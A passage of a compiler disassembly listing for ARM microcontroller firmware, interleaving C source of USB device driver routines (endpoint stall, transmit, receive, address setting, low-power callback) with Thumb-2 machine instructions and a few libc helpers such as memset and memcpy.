    break;
 800ccbc:	bf00      	nop
  }
  return usb_status;
 800ccbe:	7bfb      	ldrb	r3, [r7, #15]
}
 800ccc0:	4618      	mov	r0, r3
 800ccc2:	3710      	adds	r7, #16
 800ccc4:	46bd      	mov	sp, r7
 800ccc6:	bd80      	pop	{r7, pc}

0800ccc8 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ccc8:	b580      	push	{r7, lr}
 800ccca:	b084      	sub	sp, #16
 800cccc:	af00      	add	r7, sp, #0
 800ccce:	6078      	str	r0, [r7, #4]
 800ccd0:	460b      	mov	r3, r1
 800ccd2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccd4:	2300      	movs	r3, #0
 800ccd6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccd8:	2300      	movs	r3, #0
 800ccda:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800ccdc:	687b      	ldr	r3, [r7, #4]
 800ccde:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cce2:	78fa      	ldrb	r2, [r7, #3]
 800cce4:	4611      	mov	r1, r2
 800cce6:	4618      	mov	r0, r3
 800cce8:	f7f5 fb7c 	bl	80023e4 <HAL_PCD_EP_SetStall>
 800ccec:	4603      	mov	r3, r0
 800ccee:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccf0:	7bbb      	ldrb	r3, [r7, #14]
 800ccf2:	2b03      	cmp	r3, #3
 800ccf4:	d816      	bhi.n	800cd24 <USBD_LL_StallEP+0x5c>
 800ccf6:	a201      	add	r2, pc, #4	; (adr r2, 800ccfc <USBD_LL_StallEP+0x34>)
 800ccf8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ccfc:	0800cd0d 	.word	0x0800cd0d
 800cd00:	0800cd13 	.word	0x0800cd13
 800cd04:	0800cd19 	.word	0x0800cd19
 800cd08:	0800cd1f 	.word	0x0800cd1f
    case HAL_OK :
      usb_status = USBD_OK;
 800cd0c:	2300      	movs	r3, #0
 800cd0e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd10:	e00b      	b.n	800cd2a <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd12:	2303      	movs	r3, #3
 800cd14:	73fb      	strb	r3, [r7, #15]
    break;
 800cd16:	e008      	b.n	800cd2a <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd18:	2301      	movs	r3, #1
 800cd1a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd1c:	e005      	b.n	800cd2a <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd1e:	2303      	movs	r3, #3
 800cd20:	73fb      	strb	r3, [r7, #15]
    break;
 800cd22:	e002      	b.n	800cd2a <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd24:	2303      	movs	r3, #3
 800cd26:	73fb      	strb	r3, [r7, #15]
    break;
 800cd28:	bf00      	nop
  }
  return usb_status;
 800cd2a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd2c:	4618      	mov	r0, r3
 800cd2e:	3710      	adds	r7, #16
 800cd30:	46bd      	mov	sp, r7
 800cd32:	bd80      	pop	{r7, pc}

0800cd34 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd34:	b580      	push	{r7, lr}
 800cd36:	b084      	sub	sp, #16
 800cd38:	af00      	add	r7, sp, #0
 800cd3a:	6078      	str	r0, [r7, #4]
 800cd3c:	460b      	mov	r3, r1
 800cd3e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd40:	2300      	movs	r3, #0
 800cd42:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd44:	2300      	movs	r3, #0
 800cd46:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cd48:	687b      	ldr	r3, [r7, #4]
 800cd4a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd4e:	78fa      	ldrb	r2, [r7, #3]
 800cd50:	4611      	mov	r1, r2
 800cd52:	4618      	mov	r0, r3
 800cd54:	f7f5 fba6 	bl	80024a4 <HAL_PCD_EP_ClrStall>
 800cd58:	4603      	mov	r3, r0
 800cd5a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd5c:	7bbb      	ldrb	r3, [r7, #14]
 800cd5e:	2b03      	cmp	r3, #3
 800cd60:	d816      	bhi.n	800cd90 <USBD_LL_ClearStallEP+0x5c>
 800cd62:	a201      	add	r2, pc, #4	; (adr r2, 800cd68 <USBD_LL_ClearStallEP+0x34>)
 800cd64:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd68:	0800cd79 	.word	0x0800cd79
 800cd6c:	0800cd7f 	.word	0x0800cd7f
 800cd70:	0800cd85 	.word	0x0800cd85
 800cd74:	0800cd8b 	.word	0x0800cd8b
    case HAL_OK :
      usb_status = USBD_OK;
 800cd78:	2300      	movs	r3, #0
 800cd7a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd7c:	e00b      	b.n	800cd96 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd7e:	2303      	movs	r3, #3
 800cd80:	73fb      	strb	r3, [r7, #15]
    break;
 800cd82:	e008      	b.n	800cd96 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd84:	2301      	movs	r3, #1
 800cd86:	73fb      	strb	r3, [r7, #15]
    break;
 800cd88:	e005      	b.n	800cd96 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd8a:	2303      	movs	r3, #3
 800cd8c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd8e:	e002      	b.n	800cd96 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd90:	2303      	movs	r3, #3
 800cd92:	73fb      	strb	r3, [r7, #15]
    break;
 800cd94:	bf00      	nop
  }
  return usb_status;
 800cd96:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd98:	4618      	mov	r0, r3
 800cd9a:	3710      	adds	r7, #16
 800cd9c:	46bd      	mov	sp, r7
 800cd9e:	bd80      	pop	{r7, pc}

0800cda0 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cda0:	b480      	push	{r7}
 800cda2:	b085      	sub	sp, #20
 800cda4:	af00      	add	r7, sp, #0
 800cda6:	6078      	str	r0, [r7, #4]
 800cda8:	460b      	mov	r3, r1
 800cdaa:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cdac:	687b      	ldr	r3, [r7, #4]
 800cdae:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdb2:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cdb4:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cdb8:	2b00      	cmp	r3, #0
 800cdba:	da0c      	bge.n	800cdd6 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cdbc:	78fb      	ldrb	r3, [r7, #3]
 800cdbe:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cdc2:	68f9      	ldr	r1, [r7, #12]
 800cdc4:	1c5a      	adds	r2, r3, #1
 800cdc6:	4613      	mov	r3, r2
 800cdc8:	009b      	lsls	r3, r3, #2
 800cdca:	4413      	add	r3, r2
 800cdcc:	00db      	lsls	r3, r3, #3
 800cdce:	440b      	add	r3, r1
 800cdd0:	3302      	adds	r3, #2
 800cdd2:	781b      	ldrb	r3, [r3, #0]
 800cdd4:	e00b      	b.n	800cdee <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cdd6:	78fb      	ldrb	r3, [r7, #3]
 800cdd8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cddc:	68f9      	ldr	r1, [r7, #12]
 800cdde:	4613      	mov	r3, r2
 800cde0:	009b      	lsls	r3, r3, #2
 800cde2:	4413      	add	r3, r2
 800cde4:	00db      	lsls	r3, r3, #3
 800cde6:	440b      	add	r3, r1
 800cde8:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cdec:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cdee:	4618      	mov	r0, r3
 800cdf0:	3714      	adds	r7, #20
 800cdf2:	46bd      	mov	sp, r7
 800cdf4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cdf8:	4770      	bx	lr
	...

0800cdfc <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cdfc:	b580      	push	{r7, lr}
 800cdfe:	b084      	sub	sp, #16
 800ce00:	af00      	add	r7, sp, #0
 800ce02:	6078      	str	r0, [r7, #4]
 800ce04:	460b      	mov	r3, r1
 800ce06:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce08:	2300      	movs	r3, #0
 800ce0a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce0c:	2300      	movs	r3, #0
 800ce0e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800ce10:	687b      	ldr	r3, [r7, #4]
 800ce12:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce16:	78fa      	ldrb	r2, [r7, #3]
 800ce18:	4611      	mov	r1, r2
 800ce1a:	4618      	mov	r0, r3
 800ce1c:	f7f5 f97f 	bl	800211e <HAL_PCD_SetAddress>
 800ce20:	4603      	mov	r3, r0
 800ce22:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ce24:	7bbb      	ldrb	r3, [r7, #14]
 800ce26:	2b03      	cmp	r3, #3
 800ce28:	d816      	bhi.n	800ce58 <USBD_LL_SetUSBAddress+0x5c>
 800ce2a:	a201      	add	r2, pc, #4	; (adr r2, 800ce30 <USBD_LL_SetUSBAddress+0x34>)
 800ce2c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce30:	0800ce41 	.word	0x0800ce41
 800ce34:	0800ce47 	.word	0x0800ce47
 800ce38:	0800ce4d 	.word	0x0800ce4d
 800ce3c:	0800ce53 	.word	0x0800ce53
    case HAL_OK :
      usb_status = USBD_OK;
 800ce40:	2300      	movs	r3, #0
 800ce42:	73fb      	strb	r3, [r7, #15]
    break;
 800ce44:	e00b      	b.n	800ce5e <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce46:	2303      	movs	r3, #3
 800ce48:	73fb      	strb	r3, [r7, #15]
    break;
 800ce4a:	e008      	b.n	800ce5e <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce4c:	2301      	movs	r3, #1
 800ce4e:	73fb      	strb	r3, [r7, #15]
    break;
 800ce50:	e005      	b.n	800ce5e <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce52:	2303      	movs	r3, #3
 800ce54:	73fb      	strb	r3, [r7, #15]
    break;
 800ce56:	e002      	b.n	800ce5e <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800ce58:	2303      	movs	r3, #3
 800ce5a:	73fb      	strb	r3, [r7, #15]
    break;
 800ce5c:	bf00      	nop
  }
  return usb_status;
 800ce5e:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce60:	4618      	mov	r0, r3
 800ce62:	3710      	adds	r7, #16
 800ce64:	46bd      	mov	sp, r7
 800ce66:	bd80      	pop	{r7, pc}

0800ce68 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce68:	b580      	push	{r7, lr}
 800ce6a:	b086      	sub	sp, #24
 800ce6c:	af00      	add	r7, sp, #0
 800ce6e:	60f8      	str	r0, [r7, #12]
 800ce70:	607a      	str	r2, [r7, #4]
 800ce72:	603b      	str	r3, [r7, #0]
 800ce74:	460b      	mov	r3, r1
 800ce76:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce78:	2300      	movs	r3, #0
 800ce7a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce7c:	2300      	movs	r3, #0
 800ce7e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800ce80:	68fb      	ldr	r3, [r7, #12]
 800ce82:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce86:	7af9      	ldrb	r1, [r7, #11]
 800ce88:	683b      	ldr	r3, [r7, #0]
 800ce8a:	687a      	ldr	r2, [r7, #4]
 800ce8c:	f7f5 fa5a 	bl	8002344 <HAL_PCD_EP_Transmit>
 800ce90:	4603      	mov	r3, r0
 800ce92:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce94:	7dbb      	ldrb	r3, [r7, #22]
 800ce96:	2b03      	cmp	r3, #3
 800ce98:	d816      	bhi.n	800cec8 <USBD_LL_Transmit+0x60>
 800ce9a:	a201      	add	r2, pc, #4	; (adr r2, 800cea0 <USBD_LL_Transmit+0x38>)
 800ce9c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cea0:	0800ceb1 	.word	0x0800ceb1
 800cea4:	0800ceb7 	.word	0x0800ceb7
 800cea8:	0800cebd 	.word	0x0800cebd
 800ceac:	0800cec3 	.word	0x0800cec3
    case HAL_OK :
      usb_status = USBD_OK;
 800ceb0:	2300      	movs	r3, #0
 800ceb2:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb4:	e00b      	b.n	800cece <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ceb6:	2303      	movs	r3, #3
 800ceb8:	75fb      	strb	r3, [r7, #23]
    break;
 800ceba:	e008      	b.n	800cece <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cebc:	2301      	movs	r3, #1
 800cebe:	75fb      	strb	r3, [r7, #23]
    break;
 800cec0:	e005      	b.n	800cece <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cec2:	2303      	movs	r3, #3
 800cec4:	75fb      	strb	r3, [r7, #23]
    break;
 800cec6:	e002      	b.n	800cece <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800cec8:	2303      	movs	r3, #3
 800ceca:	75fb      	strb	r3, [r7, #23]
    break;
 800cecc:	bf00      	nop
  }
  return usb_status;
 800cece:	7dfb      	ldrb	r3, [r7, #23]
}
 800ced0:	4618      	mov	r0, r3
 800ced2:	3718      	adds	r7, #24
 800ced4:	46bd      	mov	sp, r7
 800ced6:	bd80      	pop	{r7, pc}

0800ced8 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ced8:	b580      	push	{r7, lr}
 800ceda:	b086      	sub	sp, #24
 800cedc:	af00      	add	r7, sp, #0
 800cede:	60f8      	str	r0, [r7, #12]
 800cee0:	607a      	str	r2, [r7, #4]
 800cee2:	603b      	str	r3, [r7, #0]
 800cee4:	460b      	mov	r3, r1
 800cee6:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cee8:	2300      	movs	r3, #0
 800ceea:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ceec:	2300      	movs	r3, #0
 800ceee:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800cef0:	68fb      	ldr	r3, [r7, #12]
 800cef2:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cef6:	7af9      	ldrb	r1, [r7, #11]
 800cef8:	683b      	ldr	r3, [r7, #0]
 800cefa:	687a      	ldr	r2, [r7, #4]
 800cefc:	f7f5 f9d9 	bl	80022b2 <HAL_PCD_EP_Receive>
 800cf00:	4603      	mov	r3, r0
 800cf02:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cf04:	7dbb      	ldrb	r3, [r7, #22]
 800cf06:	2b03      	cmp	r3, #3
 800cf08:	d816      	bhi.n	800cf38 <USBD_LL_PrepareReceive+0x60>
 800cf0a:	a201      	add	r2, pc, #4	; (adr r2, 800cf10 <USBD_LL_PrepareReceive+0x38>)
 800cf0c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cf10:	0800cf21 	.word	0x0800cf21
 800cf14:	0800cf27 	.word	0x0800cf27
 800cf18:	0800cf2d 	.word	0x0800cf2d
 800cf1c:	0800cf33 	.word	0x0800cf33
    case HAL_OK :
      usb_status = USBD_OK;
 800cf20:	2300      	movs	r3, #0
 800cf22:	75fb      	strb	r3, [r7, #23]
    break;
 800cf24:	e00b      	b.n	800cf3e <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cf26:	2303      	movs	r3, #3
 800cf28:	75fb      	strb	r3, [r7, #23]
    break;
 800cf2a:	e008      	b.n	800cf3e <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cf2c:	2301      	movs	r3, #1
 800cf2e:	75fb      	strb	r3, [r7, #23]
    break;
 800cf30:	e005      	b.n	800cf3e <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cf32:	2303      	movs	r3, #3
 800cf34:	75fb      	strb	r3, [r7, #23]
    break;
 800cf36:	e002      	b.n	800cf3e <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800cf38:	2303      	movs	r3, #3
 800cf3a:	75fb      	strb	r3, [r7, #23]
    break;
 800cf3c:	bf00      	nop
  }
  return usb_status;
 800cf3e:	7dfb      	ldrb	r3, [r7, #23]
}
 800cf40:	4618      	mov	r0, r3
 800cf42:	3718      	adds	r7, #24
 800cf44:	46bd      	mov	sp, r7
 800cf46:	bd80      	pop	{r7, pc}

0800cf48 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cf48:	b580      	push	{r7, lr}
 800cf4a:	b082      	sub	sp, #8
 800cf4c:	af00      	add	r7, sp, #0
 800cf4e:	6078      	str	r0, [r7, #4]
 800cf50:	460b      	mov	r3, r1
 800cf52:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800cf54:	687b      	ldr	r3, [r7, #4]
 800cf56:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cf5a:	78fa      	ldrb	r2, [r7, #3]
 800cf5c:	4611      	mov	r1, r2
 800cf5e:	4618      	mov	r0, r3
 800cf60:	f7f5 f9d8 	bl	8002314 <HAL_PCD_EP_GetRxCount>
 800cf64:	4603      	mov	r3, r0
}
 800cf66:	4618      	mov	r0, r3
 800cf68:	3708      	adds	r7, #8
 800cf6a:	46bd      	mov	sp, r7
 800cf6c:	bd80      	pop	{r7, pc}
	...

0800cf70 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cf70:	b580      	push	{r7, lr}
 800cf72:	b082      	sub	sp, #8
 800cf74:	af00      	add	r7, sp, #0
 800cf76:	6078      	str	r0, [r7, #4]
 800cf78:	460b      	mov	r3, r1
 800cf7a:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cf7c:	78fb      	ldrb	r3, [r7, #3]
 800cf7e:	2b00      	cmp	r3, #0
 800cf80:	d002      	beq.n	800cf88 <HAL_PCDEx_LPM_Callback+0x18>
 800cf82:	2b01      	cmp	r3, #1
 800cf84:	d013      	beq.n	800cfae <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cf86:	e023      	b.n	800cfd0 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cf88:	687b      	ldr	r3, [r7, #4]
 800cf8a:	699b      	ldr	r3, [r3, #24]
 800cf8c:	2b00      	cmp	r3, #0
 800cf8e:	d007      	beq.n	800cfa0 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf90:	f000 f84a 	bl	800d028 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf94:	4b10      	ldr	r3, [pc, #64]	; (800cfd8 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf96:	691b      	ldr	r3, [r3, #16]
 800cf98:	4a0f      	ldr	r2, [pc, #60]	; (800cfd8 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf9a:	f023 0306 	bic.w	r3, r3, #6
 800cf9e:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cfa0:	687b      	ldr	r3, [r7, #4]
 800cfa2:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cfa6:	4618      	mov	r0, r3
 800cfa8:	f7fe fa66 	bl	800b478 <USBD_LL_Resume>
    break;
 800cfac:	e010      	b.n	800cfd0 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cfae:	687b      	ldr	r3, [r7, #4]
 800cfb0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cfb4:	4618      	mov	r0, r3
 800cfb6:	f7fe fa43 	bl	800b440 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cfba:	687b      	ldr	r3, [r7, #4]
 800cfbc:	699b      	ldr	r3, [r3, #24]
 800cfbe:	2b00      	cmp	r3, #0
 800cfc0:	d005      	beq.n	800cfce <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cfc2:	4b05      	ldr	r3, [pc, #20]	; (800cfd8 <HAL_PCDEx_LPM_Callback+0x68>)
 800cfc4:	691b      	ldr	r3, [r3, #16]
 800cfc6:	4a04      	ldr	r2, [pc, #16]	; (800cfd8 <HAL_PCDEx_LPM_Callback+0x68>)
 800cfc8:	f043 0306 	orr.w	r3, r3, #6
 800cfcc:	6113      	str	r3, [r2, #16]
    break;
 800cfce:	bf00      	nop
}
 800cfd0:	bf00      	nop
 800cfd2:	3708      	adds	r7, #8
 800cfd4:	46bd      	mov	sp, r7
 800cfd6:	bd80      	pop	{r7, pc}
 800cfd8:	e000ed00 	.word	0xe000ed00

0800cfdc <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cfdc:	b480      	push	{r7}
 800cfde:	b083      	sub	sp, #12
 800cfe0:	af00      	add	r7, sp, #0
 800cfe2:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cfe4:	4b03      	ldr	r3, [pc, #12]	; (800cff4 <USBD_static_malloc+0x18>)
}
 800cfe6:	4618      	mov	r0, r3
 800cfe8:	370c      	adds	r7, #12
 800cfea:	46bd      	mov	sp, r7
 800cfec:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cff0:	4770      	bx	lr
 800cff2:	bf00      	nop
 800cff4:	20000e74 	.word	0x20000e74

0800cff8 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cff8:	b480      	push	{r7}
 800cffa:	b083      	sub	sp, #12
 800cffc:	af00      	add	r7, sp, #0
 800cffe:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d000:	4b03      	ldr	r3, [pc, #12]	; (800d010 <USBD_static_malloc_MSC+0x18>)
}
 800d002:	4618      	mov	r0, r3
 800d004:	370c      	adds	r7, #12
 800d006:	46bd      	mov	sp, r7
 800d008:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d00c:	4770      	bx	lr
 800d00e:	bf00      	nop
 800d010:	20000e9c 	.word	0x20000e9c

0800d014 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d014:	b480      	push	{r7}
 800d016:	b083      	sub	sp, #12
 800d018:	af00      	add	r7, sp, #0
 800d01a:	6078      	str	r0, [r7, #4]

}
 800d01c:	bf00      	nop
 800d01e:	370c      	adds	r7, #12
 800d020:	46bd      	mov	sp, r7
 800d022:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d026:	4770      	bx	lr

0800d028 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d028:	b580      	push	{r7, lr}
 800d02a:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d02c:	f7f3 fb12 	bl	8000654 <SystemClock_Config>
}
 800d030:	bf00      	nop
 800d032:	bd80      	pop	{r7, pc}

0800d034 <memset>:
 800d034:	4402      	add	r2, r0
 800d036:	4603      	mov	r3, r0
 800d038:	4293      	cmp	r3, r2
 800d03a:	d100      	bne.n	800d03e <memset+0xa>
 800d03c:	4770      	bx	lr
 800d03e:	f803 1b01 	strb.w	r1, [r3], #1
 800d042:	e7f9      	b.n	800d038 <memset+0x4>

0800d044 <__libc_init_array>:
 800d044:	b570      	push	{r4, r5, r6, lr}
 800d046:	4d0d      	ldr	r5, [pc, #52]	; (800d07c <__libc_init_array+0x38>)
 800d048:	4c0d      	ldr	r4, [pc, #52]	; (800d080 <__libc_init_array+0x3c>)
 800d04a:	1b64      	subs	r4, r4, r5
 800d04c:	10a4      	asrs	r4, r4, #2
 800d04e:	2600      	movs	r6, #0
 800d050:	42a6      	cmp	r6, r4
 800d052:	d109      	bne.n	800d068 <__libc_init_array+0x24>
 800d054:	4d0b      	ldr	r5, [pc, #44]	; (800d084 <__libc_init_array+0x40>)
 800d056:	4c0c      	ldr	r4, [pc, #48]	; (800d088 <__libc_init_array+0x44>)
 800d058:	f000 f826 	bl	800d0a8 <_init>
 800d05c:	1b64      	subs	r4, r4, r5
 800d05e:	10a4      	asrs	r4, r4, #2
 800d060:	2600      	movs	r6, #0
 800d062:	42a6      	cmp	r6, r4
 800d064:	d105      	bne.n	800d072 <__libc_init_array+0x2e>
 800d066:	bd70      	pop	{r4, r5, r6, pc}
 800d068:	f855 3b04 	ldr.w	r3, [r5], #4
 800d06c:	4798      	blx	r3
 800d06e:	3601      	adds	r6, #1
 800d070:	e7ee      	b.n	800d050 <__libc_init_array+0xc>
 800d072:	f855 3b04 	ldr.w	r3, [r5], #4
 800d076:	4798      	blx	r3
 800d078:	3601      	adds	r6, #1
 800d07a:	e7f2      	b.n	800d062 <__libc_init_array+0x1e>
 800d07c:	0800d2f0 	.word	0x0800d2f0
 800d080:	0800d2f0 	.word	0x0800d2f0
 800d084:	0800d2f0 	.word	0x0800d2f0
 800d088:	0800d2f4 	.word	0x0800d2f4

0800d08c <memcpy>:
 800d08c:	440a      	add	r2, r1
 800d08e:	4291      	cmp	r1, r2
 800d090:	f100 33ff 	add.w	r3, r0, #4294967295
 800d094:	d100      	bne.n	800d098 <memcpy+0xc>
 800d096:	4770      	bx	lr
 800d098:	b510      	push	{r4, lr}
 800d09a:	f811 4b01 	ldrb.w	r4, [r1], #1
